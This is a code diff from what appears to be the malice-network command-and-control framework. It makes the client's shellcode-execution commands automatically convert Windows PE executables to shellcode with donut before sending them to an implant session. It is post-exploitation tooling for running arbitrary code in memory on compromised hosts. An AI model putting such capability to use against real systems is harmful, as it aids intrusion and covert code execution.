@@ -1,6 +1,7 @@
 package exec
 
 import (
+	"github.com/chainreactors/logs"
 	"github.com/chainreactors/malice-network/client/command/common"
 	"github.com/chainreactors/malice-network/client/core"
 	"github.com/chainreactors/malice-network/client/repl"
@@ -8,6 +9,9 @@ import (
 	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
 	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
 	"github.com/chainreactors/malice-network/helper/proto/services/clientrpc"
+	"github.com/chainreactors/malice-network/helper/utils/donut"
+	"github.com/chainreactors/malice-network/helper/utils/pe"
+	"github.com/kballard/go-shellquote"
 	"github.com/spf13/cobra"
 	"math"
 )
@@ -30,11 +34,21 @@ func ExecShellcode(rpc clientrpc.MaliceRPCClient, sess *core.Session, shellcodeP
 	if arch == "" {
 		arch = sess.Os.Arch
 	}
-	shellcodeBin, err := common.NewBinary(consts.ModuleExecuteShellcode, shellcodePath, args, output, timeout, arch, process, sac)
+
+	binary, err := common.NewBinary(consts.ModuleExecuteShellcode, shellcodePath, args, output, timeout, arch, process, sac)
 	if err != nil {
 		return nil, err
 	}
-	task, err := rpc.ExecuteShellcode(sess.Context(), shellcodeBin)
+	if pe.IsPeExt(shellcodePath) {
+		cmdline := shellquote.Join(args...)
+		binary.Bin, err = donut.DonutShellcodeFromPE(shellcodePath, binary.Bin, arch, cmdline, "", "", false, true)
+		if err != nil {
+			return nil, err
+		}
+		logs.Log.Infof("found pe file, auto convert to shellcode with donut")
+		binary.Args = nil
+	}
+	task, err := rpc.ExecuteShellcode(sess.Context(), binary)
 	if err != nil {
 		return nil, err
 	}
@@ -60,6 +74,15 @@ func InlineShellcode(rpc clientrpc.MaliceRPCClient, sess *core.Session, path str
 	binary, err := common.NewBinary(consts.ModuleExecuteShellcode, path, args, output, timeout, arch, process, nil)
 	if err != nil {
 		return nil, err
+	}
+	if pe.IsPeExt(path) {
+		cmdline := shellquote.Join(args...)
+		binary.Bin, err = donut.DonutShellcodeFromPE(path, binary.Bin, arch, cmdline, "", "", false, true)
+		if err != nil {
+			return nil, err
+		}
+		logs.Log.Infof("found pe file, auto convert to shellcode with donut")
+		//binary.Args = nil
 	}
 	shellcodeTask, err := rpc.ExecuteShellcode(sess.Context(), binary)
 	if err != nil {
